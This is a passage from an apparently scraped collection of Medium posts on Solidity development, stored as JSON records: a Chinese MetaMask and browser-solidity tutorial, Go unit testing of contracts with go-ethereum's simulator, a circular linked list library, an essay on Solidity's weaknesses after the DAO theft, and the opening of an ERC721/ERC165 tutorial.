readContract\u624d\u662fDapp\u7684\u6838\u5fc3\uff0c\u4e0d\u662fnodejs\u5982\u679c\u4f60\u60f3\u8981\u7814\u7a76Solidity\uff0c\u4f46\u6c92\u78b0\u904enodejs\uff0c\u90a3\u9ebc\u672c\u7bc7\u662f\u5c08\u9580\u70ba\u4f60\u800c\u5beb\u7684\u3002\u53ea\u9700\u8981\u4f7f\u7528\u7db2\u9801\u7248\u7684Solidity\u7de8\u8f2f\u5668(\u7db2\u5740)\uff0c\u4ee5\u53ca\u5b89\u88ddMetaMask\u5c31\u53ef\u4ee5\u958b\u5fc3\u7684\u64b0\u5beb\u3001\u90e8\u7f72\u3001\u6e2c\u8a66\u667a\u80fd\u5408\u7d04\u3002\u6703\u60f3\u5beb\u9019\u7bc7\u7684\u539f\u56e0\u662f\u9019\u6a23\u7684\uff0c\u7576\u521d\u6211\u60f3\u5b78\u5982\u4f55\u5bebSolidity\uff0c\u4f5c\u70ba\u4e00\u500b\u521d\u5b78\u8005\u5927\u6982\u5c31\u662f\u76f4\u63a5\u88ddEthereum\u5b98\u7db2\u63d0\u4f9b\u7684Wallet\uff0c\u4f7f\u7528\u5b83\u5167\u5efa\u7684\u7de8\u8f2f\u5668\u4f86\u958b\u767c\uff0c\u4f46\u662f\u90e8\u7f72\u7684\u6642\u5019\u7d93\u5e38\u6703\u5931\u6557\uff0c\u4e5f\u627e\u4e0d\u51fa\u539f\u56e0\uff0c\u5340\u584a\u540c\u6b65\u53c8\u975e\u5e38\u7de9\u6162\uff0c\u5be6\u5728\u662f\u4e0d\u592a\u597d\u7528\u3002\u8017\u8cbb\u4e00\u756a\u5de5\u592bgoogle\u4e4b\u5f8c\uff0c\u767c\u73fe testrpc + truffle \u4e5f\u662f\u4e0d\u932f\u7684\u958b\u767c\u5de5\u5177\u7d44\u5408\uff0c\u7136\u800c\u6211\u5c31\u662f\u9019\u6642\u5019\u958b\u59cb\u88abnodejs\u7d81\u67b6\u7684XD\uff0c\u5beb\u5b8ccontract\u4e4b\u5f8c\u8981\u518d\u82b1\u5f88\u591a\u7684\u529b\u6c23\u5bebnodejs\u624d\u80fd\u6e2c\u8a66\u554a\u3002\u4e0d\u7ba1\u4f60\u7684Solidity\u5b78\u7fd2\u8def\u5f91\u70ba\u4f55\uff0c\u7e3d\u662f\u6703\u78b0\u5230nodejs\uff0c\u5be6\u5728\u662f\u4e00\u4ef6\u975e\u5e38\u5947\u602a\u7684\u4e8b\u60c5\u554a\uff011. \u5b89\u88ddMetaMask\u9019\u662f\u4e00\u500bChrome\u7684\u5957\u4ef6\uff0c\u6240\u4ee5\u4f60\u8981\u5148\u5b89\u88ddChrome\uff0c\u518d\u5b89\u88ddMetaMask\uff0c\u88dd\u5b8c\u4e4b\u5f8cChrome\u53f3\u4e0a\u89d2\u5c31\u6703\u6709\u96bb\u72d0\u72f8\u8dd1\u51fa\u4f86\uff0c\u958b\u597d\u5e33\u865f\u4e4b\u5f8c\u5c31\u53ef\u4ee5\u9032\u5165\u4e0b\u4e00\u6b65\u3002\u9ede\u4e00\u4e0b\u6703\u8df3\u51fa\u64cd\u4f5c\u8996\u7a97\u6372\u5230\u6700\u4e0b\u9762\u5c31\u53ef\u4ee5\u6309continue\u8a2d\u5b9a\u4e00\u500b\u5bc6\u78bc(\u72d0\u72f8\u6703\u5077\u770bXD)\u8a18\u4f4f\u96a8\u6a5f\u7522\u751f\u768412\u500b\u5b57\uff0c\u53ef\u4ee5\u7528\u4f86\u7522\u751f\u4e00\u6a23\u7684\u5e33\u865f (\u4f60\u770b\u5230\u7684\u4e00\u5b9a\u4e0d\u662f\u4e0a\u9762\u9019\u7d44XD)\u9019\u6a23\u5c31\u958b\u597d\u5e33\u865f\u4e86\uff0c\u56e0\u70ba\u662f\u5728Ropsten testnet\u6240\u4ee5\u88e1\u9762\u67091 eth\u53ef\u4ee5\u7528\uff0c\u5f88\u8b9a2. \u4f7f\u7528\u7db2\u9801\u7248\u7684Solidity\u7de8\u8f2f\u5668step 1. \u958b\u555fbrowser-solidity\u7db2\u9801\u3002\u7b2c\u4e00\u6b21\u4f7f\u7528\u6703\u81ea\u52d5\u8f09\u5165\u4e00\u500b\u7bc4\u4f8bstep 2. \u70ba\u4e86\u5bb9\u6613\u793a\u7bc4\u9996\u5148\u63db\u500b\u7c21\u55ae\u7684\u7bc4\u4f8b\uff0c\u7136\u5f8c\u78ba\u8a8d\u6709\u9078\u64c7Injected Web3\u9078\u9805\uff0c\u4e4b\u5f8c\u6309\u4e0bCreate\u5c31\u6703\u81ea\u52d5\u900f\u904eMetaMask\u767c\u9001\u90e8\u7f72Contract\u7684\u4ea4\u6613\u3002\u6309\u4e0bCreate\u4e4b\u5f8c\u6703\u8df3\u51faMetaMask\u7684\u8996\u7a97\u6309\u4e0bAccept\u6309\u958b\u72d0\u72f8\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u591a\u4e86\u4e00\u500b\u4ea4\u6613\u7d00\u9304\u7b49\u4e00\u4e0b\u5c31\u53ef\u4ee5\u770b\u5230\u4ea4\u6613\u6210\u529f\uff0c\u9019\u5c07\u5c31\u90e8\u7f72\u597dContractstep 3. \u56de\u5230browser-solidity\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u591a\u4e86\u5169\u500bcontract\u5b9a\u7fa9\u7684function\u53ef\u4ee5\u4f7f\u7528\uff0cconstant function\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff0c\u5c31\u50cf\u4e0b\u5716\u7684get\uff0c\u5176\u4ed6\u7684function\u4e00\u6a23\u6703\u900f\u904eMetaMask\u767c\u51fa\u4ea4\u6613\uff0c\u5982\u4e0b\u5716\u7684set\u3002\u4efb\u610f\u8f38\u5165set\u7684\u503c\uff0c\u6309\u4e0bset\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u4e0b\u5716\u7b49\u4ea4\u6613\u6210\u529f\u4e4b\u5f8c\uff0c\u518dget\u5c31\u53ef\u4ee5\u770b\u5230\u503c\u5df2\u7d93\u8b8a\u6210256\u6709\u9452\u65bcDapp\u7684\u6f0f\u6d1e\u983b\u50b3\uff0c\u5927\u5bb6\u9084\u662f\u591a\u82b1\u9ede\u6642\u9593\u5728Contract\u7684\u958b\u767c\u4e0a\u9762\u5427\u3002\u88dc\u5145\uff1a\u5728browser-solidity\u7684\u7b2c\u4e8c\u9801\u53ef\u4ee5\u8a2d\u5b9a\u8981\u50b3\u9001\u591a\u5c11ether\u7d66contract\uff0c\u9019\u53ef\u4ee5\u7528\u4f86\u6e2c\u8a66payable function\u3002\u5982\u4e0a\u76840.5 ether", "responses": 3, "tags": ["Ethereum", "Solidity", "Metamask"]}, {"title": "Unit testing Solidity contracts on Ethereum with Go", "post_link": "https://medium.com/coinmonks/unit-testing-solidity-contracts-on-ethereum-with-go-3cc924091281?source=search_post", "author_name": "Nathan Murthy", "author_link": "https://medium.com/@natemurthy", "publish_date": "2018-05-13", "last_modified_date": "2018-12-11", "readtime": "6.14", "claps": 401, "voters": 38, "content": "Unit testing Solidity contracts on Ethereum with GoSmart contracts on the Ethereum blockchain can be written in the Solidity language. There are several tools and frameworks available for testing these smart contracts. This article demonstrates how to unit test these contracts in a typesafe manner without sacrificing concurrency.Nathan MurthyFollowMay 13, 2018 \u00b7 7 min readMy friend recently introduced me to writing smart contracts for decentralized applications (or dapps for short) using the Solidity programming language for the Ethereum blockchain. He mentioned to me a project he had been developing with the Truffle framework. It\u2019s a very popular tool from what I\u2019ve been hearing and seeing, and it is complemented by a confectionary of related tools with delightful names like Ganache and Drizzle. Except that once I started taking a real bite into them, they didn\u2019t leave a very pleasant aftertaste. Other testing frameworks like Embark, dapple, and Populus also exist in different library ecosystems. But all of them are either written in Python or JavaScript.I come from a Java/Scala background and more recently have been developing a lot of services written in the Go programming language for software at Tesla. So typesafety and concurrency mean a lot to me. And for those reasons, Python and JavaScript are among my least favorite programming languages for writing and maintaining scalable code. I spent some time, a few months prior to writing this piece, skimming through the source repositories of blockchain implementations like Bitcoin, LiteCoin, Ethereum, Ripple, and Monero. And of all the code I really looked at, the go-ethereum implementation stood out like a shining star to me. The code was easy to read, simple to build, and well-documented. It is effectively the leading Ethereum implementation. Many of the examples I found online for testing Solidity contracts were based on the web3.js toolkit for the Ethereum JSON-RPC specification, which was great for getting started with geth console but I wanted something simpler. And I wanted something that interfaced in-process directly with geth as opposed to something wrapped in various layers of sugary fluff or something that required me to test contracts against a live node.Blockchain Simulator in go-ethereumI went searching for Solidity unit testing libraries written in Go and was pleased to find a wiki page on Go bindings for Ethereum contracts. I was especially thrilled to discover in this write-up that go-ethereum ships with a blockchain simulator. Let me just repeat that: the Go implementation of Ethereum ships with a blockchain simulator! \u201cThat\u2019s pretty bad ass,\u201d I thought to myself.But as I followed the examples in the wiki line-by-line, I was slightly dismayed to encounter code snippets that were incompatible with the version of go-ethereum source (master@d2fe83d) that I had cloned from Github. Now feel free to skip to the next section if my details of troubleshooting the wiki examples bore you, just know that I eventually got them working :) But for the more curious reader, the specific code that broke with my build was:sim := backends.NewSimulatedBackend(        core.GenesisAccount{                Address: auth.From,                Balance: big.NewInt(10000000000),        })which results in the compilation error:cannot use core.GenesisAccount literal (type core.GenesisAccount) as type core.GenesisAlloc in argument to backends.NewSimulatedBackendGotta love compilers, right? Ok, so the issue with this build is that genesis handling was refactored in geth 1.6.0 and the article above from @karalabe was authored just a few months before that release. The type signature of the NewSimulatedBackend constructor method now looks like this:type GenesisAlloc map[common.Address]GenesisAccountfunc NewSimulatedBackend(alloc core.GenesisAlloc) *SimulatedBackendWhich means the correct way to create a simulated Ethereum blockchain as of 1.6.0 is something along the lines of:gAlloc := map[common.Address]core.GenesisAccount{        auth.From: {Balance: big.NewInt(10000000000)},}sim := backends.NewSimulatedBackend(gAlloc)Gotta love type inference. Just imagine trying to figure any of this out in Ruby, Python, or JavaScript. Not that it can\u2019t be done, it just wouldn\u2019t be pretty. Alright, so that gets things working with the bindings provided in the wiki page linked above which got me started with this package. Now let\u2019s actually write some tests with a simpler, more up-to-date example.Unit Test: Hello WorldFirst off, I\u2019d encourage every software developer to learn some Go. I was reluctant a few years ago to learn yet-another-language especially after having invested a lot in Java and Scala, and back then I initially rubbed it off as just a fad ordained by Google. But the more I\u2019ve been reading and writing Go, the more I become impressed with the quality of software I find written in Go, the complexity of successful Go projects (e.g. Docker, Kubernetes, etc.), the community of Go developers, its adoption rate, the diversity of its libraries, and the simplicity of its use. We will download, install, and build the following dependencies as a prerequisite to our Hello World smart contract:Gogo-ethereumabigensolcIf this is your first time using Go, you can download and install any of the latest distributions from the golang \u201cGetting Started\u201d page. The examples I prepared below work with Go 1.9.2. Once you have Go installed, clone the go-ethereum source code and checkout the latest tag (which as of this writing is v1.8.7) so we can build off the most recent stable release:$ cd $GOPATH/src/github.com/ethereum$ git clone https://github.com/ethereum/go-ethereum.git $ cd go-ethereum$ git checkout v1.8.7Next we want to install the tools necessary to compile our Solidity files. Most folks already working with Solidity will be familiar with web services like Remix or the SolC API for compiling and generating Ethereum bindings from *.sol files. For writing our unit tests we will want to compile and generate these bindings locally. To do that we will install the abigen tool that ships with go-ethereum from its source folder:$ go install ./cmd/abigenand also the solc tool which you can do following the instructions on solidity.readthedocs.io \u2014 though if you are developing on Mac OS X, rather than NPM, I recommend installing the Solidity Compiler using Homebrew:$ brew tap ethereum/ethereum$ brew install solidityNow in a working directory of your choosing, let\u2019s write our \u201cHello World\u201d smart contract to a file called helloworld.sol:pragma solidity ^0.4.23;contract helloworld {    function say() public pure returns (string) {        return 'hello etherworld';    }}Next we will generate the Go bindings for this simple contract using the command:$ abigen --sol helloworld.sol --pkg main --out helloworld.goThe abigen tool will not only generate native Go bindings for your Solidity contract, it will invoke the solc command to produce an application binary interface (ABI) string (labelled as the constant HelloworldABI in helloworld.go) as well as the bytecode (labelled HelloworldBin) that will run in our simulated Ethereum virtual machine. I\u2019ve attached the gist to the output file that I code-generated with the command above for reference, but I suggest trying the codegen yourself to verify that your tooling is setup properly on your local development machine. With this Go binding in hand, we can now write a test for our Say() unit that simply expects the output string \"hello etherworld\" from this function:Now let\u2019s go ahead and run our newly minted smart contract unit test using:$ go test -v helloworld*.go=== RUN   TestRunHelloworldSuite=== RUN   TestRunHelloworldSuite/TestSay--- PASS: TestRunHelloworldSuite (0.00s)--- PASS: TestRunHelloworldSuite/TestSay (0.00s)PASSok   command-line-arguments 0.041sand voila! all our smart contract unit tests pass without having to run or configure a private network, or having to download and install a sugary add-on.In the test code above, I\u2019m using a Go package called testify that I\u2019ve found really helpful for organizing large collections of similar unit tests into suites \u2014 for instance, each contract could have a suite for which tests are written. All of the test state for reuse between units is encapsulated in HelloworldTestSuite and is then wired up in SetupTest to be configured with a blockchain simulator. First we create a private key with crypto.GenerateKey() that will be used to populate a signer function for authorizing transactions in our simulated Ethereum backend. The function bind.NewKeyedTransactor returns a *TransactOpts that points to an address from which we can make transactions. We will use this address to create a genesis block with an account allocated with funds and then create our simulated blockchain with this account via the refactored genesis handling mechanism described earlier. Then, we deploy our \u201chello world\u201d contract with DeployHelloworld where s.auth points to all the authorization data needed to make transactions from the generated account and s.sim points to a fully mocked blockchain backed by an in-memory database. The transaction to deploy this contract remains in a \u201cpending\u201d state until we s.sim.Commit() it to the blockchain, which makes the contract code available at the given address. Finally, we can invoke and test the output of our s.helloworld.Say function which can be fine-tuned with non-nil contract caller options.And there we have it: a smart contract written in Solidity tested in Go without ever needing to fire up a node or connect to a network.Acknowledgements: Special thanks to my friend Jonathan Viray for always serving up fresh thoughts.", "responses": 1, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Golang", "Solidity Tutorials"]}, {"title": "Circular Linked List in Solidity!", "post_link": "https://medium.com/modular-network/circular-linked-list-in-solidity-41ee6d1d0056?source=search_post", "author_name": "Joshua Hannan", "author_link": "https://medium.com/@joshuahannan", "publish_date": "2017-12-13", "last_modified_date": "2018-06-20", "readtime": "5.29", "claps": 250, "voters": 38, "content": "Circular Linked List in Solidity!Joshua HannanFollowDec 13, 2017 \u00b7 6 min readAren\u2019t mappings great?At Modular, we\u2019re busy working on building a great set of standard libraries that are easy to use, well documented, well tested, and most importantly, secure. We want to help make Ethereum and Solidity safer and more accessible for anyone doing development, whether they are a complete newbie or a seasoned pro. A couple months ago, I realized that a linked list would be useful for a few different applications, most importantly the implementation of the Interactive Token Sale that we are close to finishing building. So I did some research!Never Start From Scratch unless you need toI could have started from scratch but why do that when you can take advantage of the shared knowledge and work of all the other amazing developers in the community! That is something that everyone needs to take to heart here. Odds are, if there is something you want to do, someone has at least started working on it, and there is a lot you can learn from engaging with the community. We found Darryl Morris\u2019s repo here and thought it was a great place to start.From Wikipedia: In computer science, a linked list is a linear collection of data elements, in which linear order is not given by their physical placement in memory. Instead, each element points to the next.A circular doubly linked list is when two consecutive elements are linked by previous and next pointer and the last node points to first node by next pointer and also the previous pointer of the head node points to the tail node.Check out the full library here!The Linked List library provides functionality needed to create and manipulate a uint256-indexed Circular Linked List Data structure by allowing a multitude of different functions to be used to interact with the struct. Functions like push() and pop() can be used to create a FILO stack or FIFO ring buffer. getAdjacent() can also be used to iterate over the list. Here is a brief description of the functionality:Can check if the list exists and find the size.Can check if a certain node exists.Gets adjacent nodes to a specified node.Finds a spot in a sorted list for a new node to be placed.Insert nodes and create links between nodes.Remove, push, and pop nodes from the list.LinkedList is a nested mapping with the first key being the node index (uint256) and the second being the bidirectional link (bool) to a neighboring node. Key 0 implies the head so writes to LinkedList.list[0] or manually linking to Linkedlist.list[0] (e.g. list[var1][false] = 0;) are to be avoided by the calling contract.struct LinkedList{        mapping (uint256 => mapping (bool => uint256)) cll;}Design DecisionsLinked lists are powerful data structures and can be implemented in a variety of ways. I saw what Darryl Morris did in his implementation and I knew that was the best place to start.Using a mapping:/// @dev returns true if the node exists/// @param self stored linked list from contract/// @param _node a node to search forfunction nodeExists(LinkedList storage self, uint256 _node)     internal    view returns (bool){    if (self.list[_node][PREV] == HEAD &&         self.list[_node][NEXT] == HEAD)     {        if (self.list[HEAD][NEXT] == _node) {            return true;        } else {            return false;        }    } else {        return true;    }}Using the mapping to store the list made the most sense because of the efficiency benefits. Checking if a node exists in the linked list requires only a few lookups because you can instantly check to see if that entry in the mapping has a valid PREV and NEXT pointer. No iterating through the list is required, essentially making this a O(1) operation.One drawback of using a mapping is that there can only be one entry per number. This could cause some potential problems in the future, but can be circumvented by having another mapping that indicates how many entries there are at a certain index:mapping (uint256 => uint256) numEntries;Another drawback of the mapping is that it limits the amount of information that can be stored in the first order data struct. I think this is a necessary tradeoff for usability because the goal of this is to make it useable by anyone. Keeping the list struct as simple as possible accomplishes that. If someone wants to store other information about the node, they can use a separate mapping that is indexed by the nodes in the linked list, like the numEntries case explained above.Indexing with uint256:If you think about it, these could be indexed with any data type, but I chose uint256. I think this is the best choice because it allows for linked lists sorted smallest to largest. This again allows for easy lookups and inserts, because when searching for a sorted spot, you can use knowledge about what is already in the list to expedite the search, saving gas./// @dev Can be used before `insert` to build an ordered list/// @param self stored linked list from contract/// @param _node an existing node to search from, e.g. HEAD./// @param _value value to seek/// @param _direction direction to seek in//  @return next first node beyond '_node' in direction `_direction`function getSortedSpot(LinkedList storage self, uint256 _node, uint256 _value, bool _direction)internal view returns (uint256){    if (sizeOf(self) == 0) { return 0; }    require((_node == 0) || nodeExists(self,_node));    bool exists;    uint256 next;    (exists,next) = getAdjacent(self, _node, _direction);    while  ((next != 0) && (_value != next) && ((_value < next) != _direction)) next = self.list[next][_direction];    return next;}As you can see, you can make a prediction about where the node to be inserted will go, potentially speeding up the search. Obviously, the search is still O(n), but can potentially be sped up.Descriptive Function Returns:You\u2019ll see that some of the functions return multiple values, some including booleans. That is because I want the contracts to be as easy to use and understand as possible. I only want state to get modified if arguments are sent correctly. This is something that we believe is a good design practice for smart contracts in general.Unless explicitly needed, always do whatever you can to ensure that the sender of function calls is sending all the correct arguments, even if it is the owner of the contract.People make mistakes all the time and it is important to help avoid those causing issues./// @dev Returns the link of a node `_node` in direction `_direction`./// @param self stored linked list from contract/// @param _node id of the node to step from/// @param _direction direction to step infunction getAdjacent(LinkedList storage self, uint256 _node, bool _direction)    internal view returns (bool,uint256){    if (!nodeExists(self,_node)) {        return (false,0);    } else {        return (true,self.list[_node][_direction]);    }}Using the Library in Your ContractYou can find examples in the repo about how to use the Linked List library, but I will give a quick rundown of how to use it.Copy the LinkedListLib.sol into your contracts folder.Include these lines at the beginning of your contract:import \"./LinkedListLib.sol\";contract <Contract Name> {\tusing LinkedListLib for LinkedListLib.LinkedList;\tuint256 constant NULL = 0;  \tuint256 constant HEAD = 0;  \tbool constant PREV = false;  \tbool constant NEXT = true;\tLinkedListLib.LinkedList list;3. Thats it! Now you can call any of the functions in the library by using the dot operator.return list.getAdjacent(_node,_direction);We have more detailed instructions in our repo for this and all our other libraries! Go check us out!ConclusionAgain, here is the link to our library that you can use.I hope you all enjoyed my quick foray into Solidity linked lists! We\u2019re always looking for ways to improve, so any suggestions about the implementation to help with security, usability, efficiency, or documentation are greatly encouraged and appreciated!We care a lot about making Ethereum secure and useable, so check out our website to see what we do!Thanks to C. Brown for help on the article and library.", "responses": 2, "tags": ["Programming", "Ethereum", "Solidity", "Blockchain", "Linked Lists"]}, {"title": "Why Solidity isn\u2019t solid", "post_link": "https://medium.com/@Hibryda/why-solidity-isnt-solid-3341af77fc1c?source=search_post", "author_name": "Hibryda", "author_link": "https://medium.com/@Hibryda", "publish_date": "2016-06-28", "last_modified_date": "2018-04-21", "readtime": "6.01", "claps": 268, "voters": 36, "content": "Why Solidity isn\u2019t solidHibrydaFollowJun 28, 2016 \u00b7 7 min readBefore this theft event that shook Ethereum community not many people cared about security issues related to any part of Ethereum ecosystem. Hypes dictate own rules which is natural.Since almost the beginning of my posting on DAOhub I constantly tried to raise security awareness among the community members in many areas: legal, code related, governance. I was ignored or assured that everything is under control. Not crying here, it\u2019s just a confirmation of fact. I\u2019m too old to be surprised by people\u2019s lack of responsibility.As I tend to trust no one I just waited when security deficiencies will be exploited. My expectations were largely exceeded \u2014 the fuck up level was far higher that I ever predicted. I expected some small scams, not a theft of this scale.What was scariest in this theft was the fact that it exploited theDAO contract vulnerability together with faulty reward mechanism. Contract purportedly audited by best guys in this trade (no traces of serious evidence supporting this claim can be found) and written in solid as rock Solidity.My thesis here is that with no durable replacement in place of Solidity more or less costly disasters will plague this ecosystem. Coders are often lazy, often stupid, sometimes both. Best practices, curator guarded standards and alike half-measures aren\u2019t enough.I focus here on Solidity, regardless I\u2019m conscious that there are other languages created for smart contracts as Serpent or Mutan. Actually only Solidity is now developed on a regular basis.Language choiceI understand why Solidity was designed in a way it looks now. It was easy. Solidity inherits its syntax and character from Javascript (or ECMAscript to be strict). With vast resources available that enable sub-setting Javascript in a number of ways it was really good candidate for lightning fast development.Another factor that was mentioned by authors themselves was the immense Javascript popularity among coders. This assures that a coder won\u2019t flee seeing strange syntax. While this way opens the world of smart contracts to the large community of coders it comes with an adverse effect of attracting people who often code on a very basic level and have poor understanding of how coding works in a broader perspective.I will be harsh, but if even an idiot can use a certain tool, mostly idiots will use it, as they are so numerous. Nature acts here against responsible development.PermissivenessWhat is wrong with Solidity can be summed up with the above \u2014 it\u2019s way too permissive. Solidity sits atop of EVM giving an abstraction layer allowing making contracts in a human readable form. The choice of Turing complete EVM is a matter of debate, but most of problems with it could be mitigated by using a language that enforces tight constraints.In terms of constraints, Solidity cannot offer much. Mostly because it\u2019s a language that enables (or even encourages) procedural coding style. What is wrong with it?Among scores of arguments supporting functional languages in process-critical applications, discouraging procedural style at the same time, I can pinpoint one that speaks to me most. Purely functional languages can be analyzed with absolute certainty (except few degenerated cases easy to mitigate), while any complex structure done in a procedural one can be analyzed only with limited certainty depending on how much side effects are under control.In reality, the more depends on humans the worse. Humans are supposed to take care about side effects. They failed exactly here in the case of theDAO theft. The fact that they failed not only with regard to contract isn\u2019t an excuse. Solidity failed to be transparent enough to show possible threats, exactly where a language should be the first line of defense.Recently I saw some articles proposing ways to mitigate problems with Solidity. For instance, Gavin Wood has written an article titled \u201cCondition-Orientated Programming\u201d. It addresses one of techniques that can actually be used to collapse side effects of procedures into easily traceable streams of exchanged data. However, what Gavin proposed is to use modifiers without any language enforced rules that would allow only this style of coding. While modifiers raise always many caveats in terms a language flow and ambiguity they can potentially serve as a good solution here, but only if the language itself enforces their use. Otherwise curators or auditors will be given jobs, which is of course a nice gift to them, but solves no problem.There are also many news about tools enabling formal analysis of both bytecode and Solidity contracts. In this second case since a year solc uses why3 to process a proof. As proved by the recent theft it mitigated nothing. What is interesting it first translates Solidity code into OCaml subset WhyML. Which isn\u2019t surprising as Solidity itself cannot be deductively analyzed. Must be translated into a provable language. Of course something can be lost in the process. It\u2019s a prosthetic solution, expression of the \u201cpatching culture\u201d so common in Ethereum ecosystem.Solutions proposed to date give no real outcome simply because it\u2019s like reviving a corpse. Depending on them will yield problems sooner or later. Just sayin\u2019.What then can serve as a real solution?Deduction is better than luckSolidity is neither the first language addressing contracts nor the best one. It\u2019s the first that deals with Ethereum ecosystem smart contracts. In the outside world both theoretical and applied solutions with regard to contract matters exist since many years. Companies like Citrix for instance deal with it successfully since almost thirty years. They just don\u2019t call it smart contracts. Contract programming isn\u2019t a fresh invention, Eiffel is over thirty years old by now. In fact most risks could be mitigated in Solidity if some concepts from Eiffel were borrowed, for example once routines.The term \u201ccontract\u201d wasn\u2019t taken out from thin air too. It comes from analogy to legally regulated contracts. This area of law is over 2000 years old and even if the law can be fuzzy and mathematically hard to process some basic deduction principles exist there since millenia.Legal analogyIf one looks into a properly made contract several easily discernible parts can be spotted. First definitions should be there. They should cover all axioms used later, descriptions of material entities, relations and a purpose of the contract. Next, what Romans called \u201cessentialia negotii\u201d (essential terms) should be easily identifiable depending on the purpose of the contract already defined. A sale contract must include price, otherwise it\u2019s not the sale anymore, but a transfer of property being subject to different rules. Finally there must be an outcome of the contract and indication when it resolves.Not all contracts are structured as above simply because either the law in a certain jurisdiction already defines some axioms and rules or lawyers/contract parties are dumb.The purpose of this structure is to enable deduction of the outcome of contract from what is written. Of course, as natural languages are far from being strict, laws are fuzzy and people are the weakest part in this process courts are needed to resolve misunderstandings.Define!What is apparent from the above is that there is a safely deductible structure that gives strict results provided that all inputs can be strictly defined. While it\u2019s impossible in real world contracts because human relations are just too complex to be strictly defined, such approach is achievable in blockchain contracts.What is needed are axioms and definitions, processes, outcome and conclusion (termination). This structure, while totally absent in Solidity, can be achieved with help of other languages.One attempt that drawn my attention was published by Yoichi Hirai here: https://github.com/pirapira/evmverif/blob/master/sketch.v. It uses Coq, a theorem prover, thirty years old by the way, so pretty stable. While I don\u2019t think it could be used as a replacement of Solidity, it\u2019s an interesting step toward building a provable and reliable language for smart contracts. It applies the above mentioned scheme with added value of processing a proof.What is really needed is a language replacing (or being developed aside of) Solidity that encompasses this provable approach. Purely functional? Rather yes, I\u2019d suggest. Maybe with built in support for mutexes or other objects to simulate side effects while retaining control. With requirements to define all involved entities. With no space for implied values. Explicit to the brim. With guarantees of termination and outcomes. With recurrence strictly supervised. All that Solidity cannot employ.I saw somewhere an info that Vlad Zamfir builds a functional language for smart contracts. Cannot find any more detailed info though.I always embrace news that inform about attempts to implement Ethereum solutions by big industry. But I\u2019m also aware that whenever an audit will happen on these solutions one of passages in post-audit recommendations will be more or less:\u201cDue to unpredictable nature of the language used primarily in smart contracts development it is advisable to consider this solution as a proof of concept only until more reliable tools are created or adopted from other industry tested ones. Smart contracts that are a feature making Ethereum solution so attractive should be predictable if any production environment application is concerned. Otherwise risks in terms of business continuity seem to be too high.\u201dMoreover, given the fact that inside jobs are not uncommon in the big industry and auditors are aware of this, wording of above paragraph could be even more negative.We need a new language with strong principles. Possibly won\u2019t be so easy to code, but won\u2019t be easy to abuse too.", "responses": 3, "tags": ["Ethereum", "Solidity", "Formal Analysis", "Smart Contracts", "Security"]}, {"title": "Jumping into Solidity \u2014 The ERC721 Standard (Part 2)", "post_link": "https://medium.com/coinmonks/jumping-into-solidity-the-erc721-standard-part-2-383438734de5?source=search_post", "author_name": "Andrew Parker", "author_link": "https://medium.com/@anallergytoanalogy", "publish_date": "2018-04-25", "last_modified_date": "2018-09-26", "readtime": "6.53", "claps": 327, "voters": 35, "content": "Jumping into Solidity \u2014 The ERC721 Standard (Part 2)Andrew ParkerFollowApr 25, 2018 \u00b7 7 min readIn the first article of this series, I introduced the concept of a Non-Fungible Token (NFT), and the need for the ERC721 (draft) Standard. In this article, we\u2019ll be taking a first look at the ERC721 Standard interface, and breaking down some of its requirements. There will also be a brief but important detour to talk about the ERC165 Standard.\u201cA displayed content of a toolkit displayed showing tools like hammer, axe, box cutter, iron and flashlight\u201d by Todd Quackenbush on UnsplashInterfaces and the ERC165 StandardThe ERC721 Standard states that:\u201cEvery ERC-721 compliant contract must implement the ERC721 and ERC165 interfaces\u201dIf you\u2019ve never had to write a Solidity contract that works with contracts written by other developers, you may be wondering, \u201cWhat\u2019s an interface?\u201d. And regardless you\u2019re probably also wondering, \u201cWhat\u2019s the ERC165 interface?\u201d. So let\u2019s answer both those questions.InterfacesAn interface is basically an abstract contract, but the only thing you can define are unimplemented functions. It\u2019s an outline, written in Solidity code, which ensures contracts written by other developers all work well together, without having to know each other\u2019s code base.For example, if an interface defines the function balanceOf asfunction balanceOf(address _owner) external view returns (uint256);then you know that any contract which implements that interface will have a function called balanceOf which takes one argument (address) and returns one value (uint256). You also know that the mutability of this function is view, meaning that the function is able to read the contract state, but not modify it, and that it has the external modifier, which has implications for gas consumption, and how that function should be called. If your contract function\u2019s modifiers or the returns don\u2019t match those defined in the interface, it will cause your compiler to give TypeErrors and fail to compile.So by just using an interface, you\u2019re telling other developers about some of the functions your contract has, and how to use them. Easy!But this raises the question, without looking at your contract code, how can other developers know you\u2019ve used a given interface? The whole point of this interface thing was so we don\u2019t have to know each other\u2019s code bases. The answer: The ERC165 Standard.The ERC165 Standard\u201cWhat?!? Another ERC Standard?? How deep does this rabbit hole go?\u201dDon\u2019t worry, this is the only other one we\u2019ll be talking about, and it\u2019s very simple \u2014 it only has one function! The ERC165 Standard is just a way of checking if your contract\u2019s fingerprints match the fingerprint of any given interface. Let\u2019s have a look at the ERC165 Standard interface in its entirety:interface ERC165 { /// @notice Query if a contract implements an interface /// @param interfaceID The interface identifier, as  ///  specified in ERC-165 /// @dev Interface identification is specified in  ///  ERC-165. This function uses less than 30,000 gas. /// @return `true` if the contract implements `interfaceID`  ///  and `interfaceID` is not 0xffffffff, `false` otherwise function supportsInterface(bytes4 interfaceID) external view returns (bool);}So your contract has to have a function, supportsInterface, which takes a single argument representing the interfaceID (bytes4) of an interface and returns true (bool) if that interface is supported, where the interfaceID is defined in the ERC165 Standard as \u201cthe XOR of all function selectors in the interface\u201d.Or in plain English, you can give this function any interface\u2019s fingerprint (the interfaceID), and it will tell you whether that matches any of your contract\u2019s fingers.As for getting function selectors, there are two easy ways to do it. I\u2019ll use the balanceOf function from earlier as an example. To save you scrolling up, it was defined as:function balanceOf(address _owner) external view returns (uint256){   //...};Our final ERC721 contract will have implemented this function, which is why I added the curly braces, but when it comes to function selectors it doesn\u2019t actually matter \u2014 you\u2019ll see why. The two ways to get the function selector of the above function are:this.balanceOf.selectoror manually withbytes4(keccak256(\"balanceOf(address)\"))Both will return 0x70a08231 and while the first one looks cleaner in my opinion, we occasionally need the second one if an interface uses overloaded functions. You\u2019ll notice that the function selector doesn\u2019t care about parameter names, modifiers, mutability, returns or the content of the function. Just the function name and the parameter types. That\u2019s why I said it didn\u2019t matter if the function was implemented or not.But we needed \u201cthe XOR of all function selectors in the interface\u201d for the interfaceID. Lets assume an interface consists of three functions: function1(), function2() and function3().The 